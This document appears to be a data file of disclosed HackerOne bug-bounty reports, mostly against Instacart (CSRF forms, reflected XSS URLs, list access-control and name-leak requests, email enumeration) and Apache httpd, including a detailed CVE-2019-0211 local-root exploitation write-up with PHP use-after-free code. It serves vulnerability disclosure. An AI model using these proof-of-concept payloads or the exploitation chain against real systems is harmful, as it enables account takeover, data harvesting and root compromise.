Instacart,10001,0.0,50m-100m,$100.00,No value,0.0,Cross-Site Request Forgery (CSRF),Cross-Site Request Forgery (CSRF),"malcolmx  submitted a report to Instacart.Aug 9th (6 years ago)Hello,
i found Cross-Site Request Forgery (CSRF) that can change any user ZONE 
POC:
Code 288 BytesWrap lines Copy Download1<html>
2  <body>
3    <form action=""https://admin.instacart.com/api/v2/zones"" method=""POST"">
4      <input type=""hidden"" name=""zip"" value=""10001"" />
5      <input type=""hidden"" name=""override"" value=""true"" />
6      <input type=""submit"" value=""Submit request"" />
7    </form>
8  </body>
9</html>
10
put Zone you want send the request to any user and you will change his Zone
Please Watch My POC I Attached For More Details
Thanks1 attachment:F110910: CSRF_Change_Any_User_Zone_POC.mp4",https://hackerone.com/reports/157993,California,United States,San Francisco,2016,8,9,21,52
Instacart,10001,0.0,50m-100m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Cross-Site Scripting Reflected On Main Domain,"hussain_0x3c  submitted a report to Instacart.Dec 13th (7 years ago)Hi Security Team instacart
I'm Found Have Vulnerability Cross-Site Scripting Reflected on Main Domain in Variable utm_source
POC
https://www.instacart.com/green-zebra-grocery?utm_source=>""'><script>alert(/Hussain/)</script>&utm_medium=>""'><script>alert(/XSS/)</script>&utm_campaign=>""'><script>alert(/injection/)</script>
Img :- http://i.imgur.com/wSn4EU7.jpg
Test :- FF - IE 
Regards
@Hussain
    
    
        
            
                
                
                
            
        
    
hussain_0x3c   posted a comment. Updated Dec 13th (7 years ago)For  Bypass Protection  Injection  alert message  document.domain and  document.cookie in FF and IE You Can Injection Code iframe  XSS
POC 
Code 201 BytesWrap lines Copy Download1https://www.instacart.com/green-zebra-grocery?utm_source=>'%3d'>""><iframe src=""https://www.instacart.com"" onmouseover=alert(document.cookie)></iframe>/927&utm_campaign=>""'><script>alert(/XSS/)</script>
IMG :- http://i.imgur.com/8G7McWY.jpg
Thanks  . mikeinstacart   changed the status to Triaged. Dec 14th (7 years ago)Thanks @hussain. We're investigating this now.mikeinstacart   closed the report and changed the status to Resolved. Dec 15th (7 years ago)Thanks @hussain. This should be fixed now.Instacart  rewarded hussain_0x3c with a $100 bounty. Dec 15th (7 years ago)
    
    
        
            
                
                
                
            
        
    
hussain_0x3c   posted a comment. Aug 19th (6 years ago)Hi @mikeinstacart  ! Just wanted to disclose my bugs.
If you think that this ticket must stay private - not a problem , I will cancel disclosure :) hussain_0x3c   requested to disclose this report. Aug 31st (6 years ago)
    
    
        
            
                
                
                
            
        
    
hussain_0x3c   posted a comment. Sep 17th (6 years ago)Hi  @mikeinstacart  can you disclosed report ! >  This report has been disclosed. Sep 30th (6 years ago)",https://hackerone.com/reports/104917,California,United States,San Francisco,2015,12,13,7,36
Instacart,10001,0.0,50m-100m,$50.00,No value,0.0,Cross-Site Request Forgery (CSRF),CSRF To change Email Notification Settings ,"trad_zero_h  submitted a report to Instacart.Aug 9th (6 years ago)Hi i found CSRF To change Email Notification Settings 
The Code Of the HTML Page ::
Code 190 BytesWrap lines Copy Download1<html>
2  <body>
3    <form action=""https://www.instacart.com/api/v2/email_settings/76/disable?resource_token="">
4      <input type=""submit"" value=""Submit form"" />
5    </form>
6  </body>
7</html>
For Fixing you Must add CSEF Token to the Request 
i attached Video Showing the Bug 
Thanks  1 attachment:F110877: POC.mp4Summary by trad_zero_hThanks @Instacart For The Bounty And Thanks to @anf and @hitomikt  For Fixing this",https://hackerone.com/reports/157956,California,United States,San Francisco,2016,8,9,20,11
Instacart,10001,0.0,50m-100m,$150.00,No value,0.0,Information Disclosure,Fetch private list metadata and any user's personal name,"sameoldstory  submitted a report to Instacart.Aug 23rd (6 years ago)Overview
When a user creates a list, they can choose whether to make the list visible in search and whether to show their name with the list. The problem is that the attacker can still access the information that the user chose to hide. Furthermore, if the attacker gets hold of a user's ID, they can find out user's personal name irrespective of whether the user has created any lists at all.
Steps to Reproduce
Both the victim and the attacker have to be Instacart users.


Victim creates a list and unchecks both ""visible in search"" and ""show my name"" boxes.


Victim shares the link publicly.


Attacker follows the shared link and adds the list to favorites. The response from the server reveals the list metadata including victim's personal name, list title, description and images:
Code 271 BytesWrap lines Copy Download1POST /api/v2/lists/10/star_toggle
2
3{
4  ""meta"": {
5    ""code"": 200
6  },
7  ""data"": {
8    ""id"": 10,
9    ""name"": ""Test"",
10    ""description"": ""This is the description of a shopping list"",
11    ""user_id"": 10,
12    ""visible"": false,
13    ...
14    ""user_name"": ""Apoorva M"",
15    ...
16  }


Security Implications
The attacker can use the star_toggle endpoint to obtain metadata of any list regardless of what the visible flag is set to. Since list ID is incremental it doesn't take much effort to obtain metadata for all Instacart lists, both public and private.
Additional Exploit
There's one more endpoint that, although doesn't reveal nearly as much information, does reveal victim's personal name and doesn't even require the victim to have any lists:
Code 134 BytesWrap lines Copy Download1GET /api/v2/lists?user_id=10
2
3{""meta"":{""code"":200,""author_name"":""Apoorva M""},""data"":[],""pagination"":{""total"":0,""per_page"":0,""page"":1}}
The attacker can either look up personal name of the user they're interested in, or simply dump whole list of Instacart users personal names, since the user ID is also incremental.",https://hackerone.com/reports/162822,California,United States,San Francisco,2016,8,23,20,34
Instacart,10001,0.0,50m-100m,$150.00,No value,0.0,Privilege Escalation,Full access to any list,"sameoldstory  submitted a report to Instacart.Oct 4th (6 years ago)Overview
The endpoint for adding a list collaborator lacks authorization checks. A regular Instacart user can add themselves as a collaborator to any list and thus get full control over that list.
How to Reproduce


Choose a list that you want to edit, for example the one with id = 10.


Log in to Instacart.


Copy the cookie and anti-CSRF headers from one of the requests. 


Send a request:
Code 163 BytesWrap lines Copy Download1POST /api/v2/list_users
2Host: www.instacart.com
3Content-Type: application/json
4Cookie: ...
5X-CSRF-Token: ...
6
7{""list_user"":{""list_id"":10,""email"":""your@email.com""}}


Open https://www.instacart.com/api/v2/lists/10 in browser and grab the list's token (7bHoerQ in this case).


Open http://www.instacart.com/store/giant/lists/7bHoerQ/edit in browser and do whatever you want to the list.


Proof of Concept
Code 114 BytesWrap lines Copy Download1GET https://www.instacart.com/api/v2/lists/10
2
3{""meta"":{""code"":200},""data"":{""id"":10,""name"":""Test sameoldstory"" ...
Security Implications
This vulnerability can be used to:

See metadata of a private list.
See the personal name of a list owner, even if they chose to hide it.
Change metadata and items or even delete any list.
Affect product promotion by messing with popular lists.
Perform website defacement and phishing attacks.
Enhance stored XSS attacks by embedding them into the popular lists.
Summary by sameoldstoryBig thanks to @cxmcc-instacart for helping out. And big no thanks to @hitomikt for zero communication and no apology.",https://hackerone.com/reports/173969,California,United States,San Francisco,2016,10,4,23,16
Instacart,10001,0.0,50m-100m,$150.00,No value,0.0,Open Redirect,Host Header Injection/Redirection in: https://www.instacart.com/,"0xm1racle  submitted a report to Instacart.Aug 10th (6 years ago)Hi,
Your website is vulnerable to Host Header Injection because the host header can be changed to something outside the target domain
In many cases, developers are trusting the HTTP Host header value and using it to generate links, import scripts and even generate password resets links with its value. This is a very bad idea, because the HTTP Host header can be controlled by an attacker. This can be exploited using web-cache poisoning and by abusing alternative channels like password reset emails.
GET / HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
HTTP/1.1 301 Moved Permanently
Date: Tue, 09 Aug 2016 23:55:09 GMT
Location: https://google.com/
Server: nginx
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Connection: Close
Content-Type: text/html
Content-Length: 178
Reference: https://www.acunetix.com/vulnerabilities/web/host-header-attack
Regards,
Clarck2 attachments:F110937: request.pngF110938: responseinstacart.png",https://hackerone.com/reports/158019,California,United States,San Francisco,2016,8,10,0,13
Instacart,10001,0.0,50m-100m,$100.00,No value,0.0,Information Disclosure,Image Upload Path Disclosure,"mefkan  submitted a report to Instacart.Aug 10th (6 years ago)Hi,
Firstly,I couldn't see anything about Path Disclosure in your policy,so I've decided to report it.
Steps to reproduce :
1-Create a list for a store
2-Add background image from link (File has to be .svg) like aaa.com/aaa.svg
3-Then it will give an error
Let's take a look to that error
{""meta"":{""code"":400,""error_type"":""List Error"",""error_message"":""There was an error while updating this list"",""errors"":[""Image must be a JPEG or PNG"",""Image Failed to manipulate with rmagick, maybe it is not an image? Original Error: no decode delegate for this image format `/var/app/20160809T225101Z/tmp/uploads/1470789216-24489-0001-8854/full_redirect_2.svg' @ error/svg.c/ReadSVGImage/2871""]}}
As you can understand from error's Response this is the path disclosure
/var/app/20160809T225101Z/tmp/uploads/1470789216-24489-0001-8854/full_redirect_2.svg
I'm gonna add a screenshot from Request and Response for being more clear about it.
Thanks,Instacart.1 attachment:F110942: instacart.png",https://hackerone.com/reports/158021,California,United States,San Francisco,2016,8,10,0,46
Instacart,10001,0.0,50m-100m,$150.00,No value,0.0,Denial of Service,Issues with uploading list images,"cablej  submitted a report to Instacart.Aug 16th (6 years ago)Hi,
There are several issues with uploading images for a list, i.e. with a PUT request to https://www.instacart.com/api/v2/lists/153253 and passing list[remote_image_url].
First, information about open ports and SSH information can be disclosed via different urls. For example, PUT-ing localhost:80 will return a 404 error, but localhost:1010 will return a connection refused error. PUT-ing localhost:22 will, return ""Image could not download file: wrong status line: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3'"", showing that OpenSSH version 6.6.1p1 is being used, which is outdated and may be vulnerable to published exploits.
Passing a value such as http://google.com will show that rmagick is being used, with an error: ""Image must be a JPEG or PNG"",""Image Failed to manipulate with rmagick, maybe it is not an image? Original Error: unable to open file /tmp/magick-ezcF8DGU': No such file or directory @ error/constitute.c/ReadImage/583""`
Finally, uploading a JPG such as in [https://hackerone.com/reports/390] makes the server timeout and returns a 502 error, overflowing the memory. I have attached the image below.
Thanks for your time, and please let me know if you need any more information.1 attachment:F112575: image.jpganf Instacart staff  changed the status to Triaged. Aug 17th (6 years ago)anf Instacart staff  closed the report and changed the status to Resolved. Aug 22nd (6 years ago)Hello @cablej,
Thank you for the report. The first two issues you are mentioning were duplicates of previous reports. 
But the issue related to overflowing the memory is real and you are the first one to report it. It should now be resolved.Instacart  rewarded cablej with a $150 bounty. Aug 22nd (6 years ago)
    
    
        
            
                
                
                
            
        
    
cablej   posted a comment. Aug 23rd (6 years ago)Great, thanks for the reward and glad I could help out. I can verify that the server now returns an image size error.cablej   requested to disclose this report. Sep 5th (6 years ago)anf Instacart staff  agreed to disclose this report. Sep 26th (6 years ago)  This report has been disclosed. Sep 26th (6 years ago)",https://hackerone.com/reports/159820,California,United States,San Francisco,2016,8,16,18,46
Instacart,10001,0.0,50m-100m,$100.00,Low,2.0,Improper Authentication - Generic,Login with Google Not Authenticated on iOS App,"bhavukjain1  submitted a report to Instacart.Jan 30th (6 years ago) In your iOS application, there is Login with Google. In this, you're not authenticating a user properly and it can lead to access to user accounts.
Affected API:
https://www.instacart.com/api/v2/users/google_login_auth
In this request, these are the parameters: access_token, client_id,id_token, login_only, read_terms.
In the parameter: id_token, you're passing the token generated by Google user authentication. But the token generated is not properly authenticated at your backend. You're not authenticating if the token is generated by your app or not.
For example, I logged in with the app Meetup via login with Google. The id_token generated by Google for this app, when used with your /google_login_auth API, it's still get accepted.
This means ​an app like Meetup can access the user accounts of your users using the id_token generated by Meetup. This can compromise your user's accounts.
The proper way of authenticating the user is mentioned here:
https://developers.google.com/identity/sign-in/web/backend-auth#verify-the-integrity-of-the-id-token",https://hackerone.com/reports/202177,California,United States,San Francisco,2017,1,30,17,31
Instacart,10001,0.0,50m-100m,$150.00,Medium,5.45,None,Get all instacart emails - missing rate limit on /accounts/register,"003random  submitted a report to Instacart.Oct 6th (5 years ago)Hey Instacart team,
When signing up for an account, you enter your email. When this email is already in use, the server responds with ""{""errors"":{""email"":[""has already been taken""]}}""
This in not a problem, but the fact that you could send this request unlimited times is the issue.
This way we can easily get a list of all users emails signed up at Instacart.
PoC
Send this POST request to ""https://www.instacart.com/accounts/register""

POST /accounts/register HTTP/1.1
Host: www.instacart.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
X-CSRF-Token: /KCdKtn9A4Oaf7/MAlc/ixhz4h4IPuxEWLRBcAg/heMpt3kcLiMYDZ9ZUnLcHtA5SR+fDrJVorqIuO0h9zr/uQ==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.instacart.com/
Content-Length: 316
Cookie: build_sha=31340a4bf316c78fff58fe0f5ed3b92ad2c591dc; ahoy_visitor=8ca5f95a-239e-4853-bd06-3f4461c67ae1; ahoy_visit=5493572a-38ab-4bea-ab80-9c005fa2e94b; _instacart_session=Your_Session_Here; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22c00a35c4-3997-4dc9-841c-85655de95dea%22
DNT: 1
Connection: close


user%5Bsource%5D=web&user%5Bremember_me%5D=1&user%5Bzip_code%5D=22222&user%5Bfirst_name%5D=test&user%5Blast_name%5D=test&user%5Bemail%5D=The_Email_Here&user%5Bpassword%5D=&read_terms=true&authenticity_token=%2FKCdKtn9A4Oaf7%2FMAlc%2Fixhz4h4IPuxEWLRBcAg%2FheMpt3kcLiMYDZ9ZUnLcHtA5SR%2BfDrJVorqIuO0h9zr%2FuQ%3D%3D

The password field is left empty on purpose, so that when the email is not in use, no account will be made.
If the email exists, this will be the response: ""{""errors"":{""email"":[""has already been taken""],""password"":[""can't be blank""]}}""
When the email doesn't exist in the database, then this will be returned: ""{""errors"":{""password"":[""can't be blank""]}}""
Fix
to fix this issue, you could implement an timeout after a number of requests in a period of time.
just like it is implemented here: https://www.instacart.com/accounts/password
this returns ""429 Too Many Requests"" when making multiple requests in a short period of time.
If you have any questions, feel free to ask them ;)
@003random",https://hackerone.com/reports/275186,California,United States,San Francisco,2017,10,6,16,27
Instacart,10001,0.0,50m-100m,$100.00,No value,0.0,Open Redirect,Hyperlink Injection in Friend Invitation Emails,"corb3nik  submitted a report to Instacart.Aug 11th (6 years ago)Description
A user can change their name to a URL in order to send email invitations containing malicious hyperlinks.
Steps to Reproduce

Create a new Instacart account with the first name http://example.com
Navigate to https://www.instacart.com/store/referrals
Send an email invitation to an email address that you control

You will receive a new email with the first word being a link to a potentially malicious site.
Consequences
This permits users to send malicious/phishing links to potential clients. It could also have an effect on how spam filters treat instacart.com emails.1 attachment:F111496: proof.png",https://hackerone.com/reports/158554,California,United States,San Francisco,2016,8,11,19,23
Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",Medium,6.5,Buffer Over-read,ap_find_token() Buffer Overread,"javier_sensepost  submitted a report to Internet Bug Bounty.Jun 20th (5 years ago)Versions Affected:
httpd 2.2.32
httpd 2.4.24 (unreleased)
httpd 2.4.25
Description:
The HTTP strict parsing changes added in 2.2.32 and 2.4.24 introduced a
bug in token list parsing, which allows ap_find_token() to search past
the end of its input string. By maliciously crafting a sequence of
request headers, an attacker may be able to cause a segmentation fault,
or to force ap_find_token() to return an incorrect value.
Mitigation:
2.2.32 users should either apply the patch available at
https://www.apache.org/dist/httpd/patches/apply_to_2.2.32/CVE-2017-7668.patch
or upgrade in the future to 2.2.33, which is currently unreleased.
2.4.25 users should upgrade to 2.4.26.
You can contact me on javijmor@gmail.com or javier@sensepost.com
I would like to donate the bug bounty's money (if any) to charity and preferably do it in behalf of my company, SensePost..arice HackerOne staff  updated CVE reference to CVE-2017-7668. Jul 11th (5 years ago)arice HackerOne staff  changed the report title from Apache httdp CVE-2017-7668 Buffer-over-read to ap_find_token() Buffer Overread. Jul 11th (5 years ago)Internet Bug Bounty  rewarded javier_sensepost with a $1,500 bounty. Jul 11th (5 years ago)arice HackerOne staff  closed the report and changed the status to Resolved. Jul 11th (5 years ago)arice HackerOne staff  requested to disclose this report. Jul 11th (5 years ago)  This report has been disclosed. Aug 10th (5 years ago)",https://hackerone.com/reports/241610,No value,No value,No value,2017,6,20,8,36
Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",High,7.8,Privilege Escalation,Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation,"real  submitted a report to Internet Bug Bounty.Apr 2nd (4 years ago)Hello,
I reported a Local Root privilege escalation vulnerability on Apache HTTPd at the beginning of the year. Apache has now patched it, as you can see here.
The vulnerability affects mod_prefork, mod_event, and mod_worker, the most used mods on Linux.
Basically, this is an arbitrary function call as root triggered whenever the server gracefully restarts, which is generally once a day.
Here is the article I plan to publish soon, as MarkDown (careful, wall of text):
Introduction
From version 2.4.17 (Oct 9, 2015) to version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.
The vulnerability is triggered when Apache gracefully restarts (apache2ctl graceful).
In standard Linux configurations, the logrotate utility runs this command once a day, at 6:25AM, in order to reset log file handles.
The vulnerability affects mod_prefork, mod_worker and mod_event. The following bug description, code walkthrough and exploit target mod_prefork.
Bug description
In MPM prefork, the main server process, running as root, manages a pool of single-threaded, low-privilege (www-data) worker processes, meant to handle HTTP requests.
In order to get feedback from its workers, Apache maintains a shared-memory area (SHM), scoreboard, which contains various informations such as the workers PIDs and the last request they handled.
Each worker is meant to maintain a process_score structure associated with its PID, and has full read/write access to the SHM.
ap_scoreboard_image: pointers to the shared memory block
Code 198 BytesWrap lines Copy Download1(gdb) p *ap_scoreboard_image 
2$3 = {
3  global = 0x7f4a9323e008, 
4  parent = 0x7f4a9323e020, 
5  servers = 0x55835eddea78
6}
7(gdb) p ap_scoreboard_image->servers[0]
8$5 = (worker_score *) 0x7f4a93240820
Example of shared memory associated with worker PID 19447
Code 641 BytesWrap lines Copy Download1(gdb) p ap_scoreboard_image->parent[0]
2$6 = {
3  pid = 19447, 
4  generation = 0, 
5  quiescing = 0 '\000', 
6  not_accepting = 0 '\000', 
7  connections = 0, 
8  write_completion = 0, 
9  lingering_close = 0, 
10  keep_alive = 0, 
11  suspended = 0, 
12  bucket = 0 <- index for all_buckets
13}
14(gdb) ptype *ap_scoreboard_image->parent
15type = struct process_score {
16    pid_t pid;
17    ap_generation_t generation;
18    char quiescing;
19    char not_accepting;
20    apr_uint32_t connections;
21    apr_uint32_t write_completion;
22    apr_uint32_t lingering_close;
23    apr_uint32_t keep_alive;
24    apr_uint32_t suspended;
25    int bucket; <- index for all_buckets
26}
When Apache gracefully restarts, its main process kills old workers and replaces them by new ones.
At this point, every old worker's bucket value will be used by the main process to access an array of his, all_buckets.
all_buckets
Code 687 BytesWrap lines Copy Download1(gdb) p $index = ap_scoreboard_image->parent[0]->bucket
2(gdb) p all_buckets[$index]
3$7 = {
4  pod = 0x7f19db2c7408, 
5  listeners = 0x7f19db35e9d0, 
6  mutex = 0x7f19db2c7550
7}
8(gdb) ptype all_buckets[$index]
9type = struct prefork_child_bucket {
10    ap_pod_t *pod;
11    ap_listen_rec *listeners;
12    apr_proc_mutex_t *mutex; <--
13}
14(gdb) ptype apr_proc_mutex_t
15apr_proc_mutex_t {
16    apr_pool_t *pool;
17    const apr_proc_mutex_unix_lock_methods_t *meth; <--
18    int curr_locked;
19    char *fname;
20    ...
21}
22(gdb) ptype apr_proc_mutex_unix_lock_methods_t
23apr_proc_mutex_unix_lock_methods_t {
24    ...
25    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); <--
26    ...
27}
No bound checks happen. Therefore, a rogue worker can change its bucket index and make it point to the shared memory, in order to control the prefork_child_bucket structure upon restart. Eventually, and before privileges are dropped, mutex->meth->child_init() is called.
This results in an arbitrary function call as root.
Vulnerable code
We'll go through server/mpm/prefork/prefork.c to find out where and how the bug happens.

A rogue worker changes its bucket index in shared memory to make it point to a structure of his, also in SHM.
At 06:25AM the next day, logrotate requests a graceful restart from Apache.
Upon this, the main Apache process will first kill workers, and then spawn new ones.
The killing is done by sending SIGUSR1 to workers. They are expected to exit ASAP.
Then, prefork_run() (L853) is called to spawn new workers. Since retained->mpm->was_graceful is true (L861), workers are not restarted straight away.
Instead, we enter the main loop (L933) and monitor dead workers' PIDs. When an old worker dies, ap_wait_or_timeout() returns its PID (L940).
The index of the process_score structure associated with this PID is stored in child_slot (L948).
If the death of this worker was not fatal (L969), make_child() is called with ap_get_scoreboard_process(child_slot)->bucket as a third argument (L985). As previously said, bucket's value has been changed by a rogue worker.
make_child() creates a new child, fork()ing (L671) the main process.
The OOB read happens (L691), and my_bucket is therefore under the control of an attacker.
child_main() is called (L722), and the function call happens a bit further (L433).
SAFE_ACCEPT(<code>) will only execute <code> if Apache listens on two ports or more, which is often the case since a server listens over HTTP (80) and HTTPS (443).
Assuming <code> is executed, apr_proc_mutex_child_init() is called, which results in a call to (*mutex)->meth->child_init(mutex, pool, fname) with mutex under control.
Privileges are dropped a bit later in the execution (L446).

Exploitation
The exploitation is a four step process:

Obtain R/W access on a worker process
Write a fake prefork_child_bucket structure in the SHM
Make all_buckets[bucket] point to the structure
Await 6:25AM to get an arbitrary function call

Advantages:

The main process never exits, so we know where everything is mapped by reading /proc/self/maps (ASLR/PIE useless)
When a worker dies (or segfaults), it is automatically restarted by the main process, so there is no risk of DOSing Apache

Problems:

PHP does not allow to read/write /proc/self/mem, which blocks us from simply editing the SHM
all_buckets is reallocated after a graceful restart (!)

## 1. Obtain R/W access on a worker process
PHP UAF 0-day
Since mod_prefork is often used in combination with mod_php, it seems natural to exploit the vulnerability through PHP. CVE-2019-6977 would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):
PHP UAF
Code 361 BytesWrap lines Copy Download1<?php
2
3class X extends DateInterval implements JsonSerializable
4{
5  public function jsonSerialize()
6  {
7    global $y, $p;
8    unset($y[0]);
9    $p = $this->y;
10    return $this;
11  }
12}
13
14function get_aslr()
15{
16  global $p, $y;
17  $p = 0;
18
19  $y = [new X('PT1S')];
20  json_encode([1234 => &$y]);
21  print(""ADDRESS: 0x"" . dechex($p) . ""\n"");
22
23  return $p;
24}
25
26get_aslr();
This is an UAF on a PHP object: we unset $y[0] (an instance of X), but it is still usable using $this.
UAF to Read/Write
We want to achieve two things:

Read memory to find all_buckets' address
Edit the SHM to change bucket index and add our custom mutex structure

Luckily for us, PHP's heap is located before those two in memory.
Memory addresses of PHP's heap, `ap_scoreboard_image->andall_buckets`*
Code 345 BytesWrap lines Copy Download1root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p
27f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so
3
4(gdb) p *ap_scoreboard_image 
5$14 = {
6  global = 0x7f4a9323e008, 
7  parent = 0x7f4a9323e020, 
8  servers = 0x55835eddea78
9}
10(gdb) p all_buckets 
11$15 = (prefork_child_bucket *) 0x7f4a9336b3f0
Since we're triggering the UAF on a PHP object, any property of this object will be UAF'd too; we can convert this zend_object UAF into a zend_string one.
This is useful because of zend_string's structure:
Code 131 BytesWrap lines Copy Download1(gdb) ptype zend_string
2type = struct _zend_string {
3    zend_refcounted_h gc;
4    zend_ulong h;
5    size_t len;
6    char val[1];
7}
The len property contains the length of the string. By incrementing it, we can read and write further in memory, and therefore access the two memory regions we're interested in: the SHM and Apache's all_buckets.
Locating bucket indexes and all_buckets
We want to change ap_scoreboard_image->parent[worker_id]->bucket for a certain worker_id. Luckily, the structure always starts at the beginning of the shared memory block, so it is easy to locate.
Shared memory location and targeted process_score structures
Code 301 BytesWrap lines Copy Download1root@apaubuntu:~# cat /proc/6318/maps | grep rw-s
27f4a9323e000-7f4a93252000 rw-s 00000000 00:05 57052                      /dev/zero (deleted)
3
4(gdb) p &ap_scoreboard_image->parent[0]
5$18 = (process_score *) 0x7f4a9323e020
6(gdb) p &ap_scoreboard_image->parent[1]
7$19 = (process_score *) 0x7f4a9323e044
To locate all_buckets, we can make use of our knowledge of the prefork_child_bucket structure. We have:
Important structures of bucket items
Code 788 BytesWrap lines Copy Download1prefork_child_bucket {
2    ap_pod_t *pod;
3    ap_listen_rec *listeners;
4    apr_proc_mutex_t *mutex; <--
5}
6
7apr_proc_mutex_t {
8    apr_pool_t *pool;
9    const apr_proc_mutex_unix_lock_methods_t *meth; <--
10    int curr_locked;
11    char *fname;
12
13    ...
14}
15
16apr_proc_mutex_unix_lock_methods_t {
17    unsigned int flags;
18    apr_status_t (*create)(apr_proc_mutex_t *, const char *);
19    apr_status_t (*acquire)(apr_proc_mutex_t *);
20    apr_status_t (*tryacquire)(apr_proc_mutex_t *);
21    apr_status_t (*release)(apr_proc_mutex_t *);
22    apr_status_t (*cleanup)(void *);
23    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); <--
24    apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);
25    apr_lockmech_e mech;
26    const char *name;
27}
all_buckets[0]->mutex will be located in the same memory region as all_buckets[0]. Since meth is a static structure, it will be located in libapr's .data. Since meth points to functions defined in libapr, each of the function pointers will be located in libapr's .text.
Since we have knowledge of those region's addresses through /proc/self/maps, we can go through every pointer in Apache's memory and find one that matches the structure. It will be all_buckets[0].
As I mentioned, all_buckets's address changes at every graceful restart. This means that when our exploit triggers, all_buckets's address will be different than the one we found. This has to be taken into account; we'll talk about this later.
## 2. Write a fake prefork_child_bucket structure in the SHM
Reaching the function call
The code path to the arbitrary function call is the following:
Code 192 BytesWrap lines Copy Download1bucket_id = ap_scoreboard_image->parent[id]->bucket
2my_bucket = all_buckets[bucket_id]
3mutex = &my_bucket->mutex
4apr_proc_mutex_child_init(mutex)
5(*mutex)->meth->child_init(mutex, pool, fname)

Calling something proper
To exploit, we make (*mutex)->meth->child_init point to zend_object_std_dtor(zend_object *object), which yields the following chain:
Code 187 BytesWrap lines Copy Download1mutex = &my_bucket->mutex
2[object = mutex]
3zend_object_std_dtor(object)
4ht = object->properties
5zend_array_destroy(ht)
6zend_hash_destroy(ht)
7val = &ht->arData[0]->val
8ht->pDestructor(val)
pDestructor is set to system, and &ht->arData[0]->val is a string.

As you can see, both leftmost structures are superimposed.
## 3. Make all_buckets[bucket] point to the structure
Problem and solution
Right now, if all_buckets' address was unchanged in between restarts, our exploit would be over:

Get R/W over all memory after PHP's heap
Find all_buckets by matching its structure
Put our structure in the SHM
Change one of the process_score.bucket in the SHM so that all_bucket[bucket]->mutex points to our payload

As all_buckets' address changes, we can do two things to improve reliability: spray the SHM and use every process_score structure - one for each PID.
Spraying the shared memory
If all_buckets' new address is not far from the old one, my_bucket will point close to our structure. Therefore, instead of having our prefork_child_bucket structure at a precise point in the SHM, we can spray it all over unused parts of the SHM. The problem is that the
structure is also used as a zend_object, and therefore it has a size of (5 * 8 =) 40 bytes to include zend_object.properties.
Spraying a structure that big over a space this small won't help us much.
To solve this problem, we superimpose the two center structures, apr_proc_mutex_t and zend_array, and spray their address in the rest of the shared memory.
The impact will be that prefork_child_bucket.mutex and zend_object.properties point to the same address.
Now, if all_bucket is relocated not too far from its original address, my_bucket will be in the sprayed area.

Using every process_score
Each Apache worker has an associated process_score structure, and with it a bucket index.
Instead of changing one process_score.bucket value, we can change every one of them, so that they cover another part of memory. For instance:
Code 284 BytesWrap lines Copy Download1ap_scoreboard_image->parent[0]->bucket = -10000 -> 0x7faabbcc00 <= all_buckets <= 0x7faabbdd00
2ap_scoreboard_image->parent[1]->bucket = -20000 -> 0x7faabbdd00 <= all_buckets <= 0x7faabbff00
3ap_scoreboard_image->parent[2]->bucket = -30000 -> 0x7faabbff00 <= all_buckets <= 0x7faabc0000
This multiplies our success rate by the number of apache workers. Upon respawn, only one worker have a valid bucket number, but this is not a problem because the others will crash, and immediately respawn.
Success rate
Different Apache servers have different number of workers. Having more workers mean we can spray the address of our mutex over less memory, but it also means we can specify more index for all_buckets. This means that having more workers improves our success rate. After a few tries on my test Apache server of 4 workers (default), I had ~80% success rate.
Again, if the exploit fails, it can be restarted the next day as Apache will still restart properly. Apache's error.log will nevertheless contain notifications about its workers segfaulting.
## 4. Await 6:25AM for the exploit to trigger
Well, that's the easy step.
Vulnerability timeline

2019-02-22 Initial contact email to security[at]apache[dot]org, with description and POC
2019-02-25 Acknowledgment of the vulnerability, working on a fix
2019-03-07 Apache's security team sends a patch for I to review, CVE assigned
2019-03-10 I approve the patch
2019-04-01 Apache HTTP version 2.4.39 released

Apache's team has been prompt to respond and patch, and nice as hell. Really good experience. PHP never answered regarding the UAF.
Exploit
I'm not releasing it just yet !
Impact
You generally obtain root privileges from www-data privileges.antenna   updated CVE reference to CVE-2019-0211. Apr 4th (4 years ago)antenna   posted a comment. Apr 4th (4 years ago)Hi @real,
Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Kind regards,
@antenna antenna   changed the report title from Apache HTTP local root to Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation. Apr 4th (4 years ago)antenna   changed the status to Triaged. Apr 4th (4 years ago)antenna   posted a comment. Apr 4th (4 years ago)Hello @real,
Thank you for your submission! I was able to validate the CVE finding exists and is resolved on Apache's side. I have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report. Please note that the status and severity are subject to change.
Regards,
@antenna real   posted a comment. May 13th (4 years ago)Hello !
Any update on this ? :)
Regards,
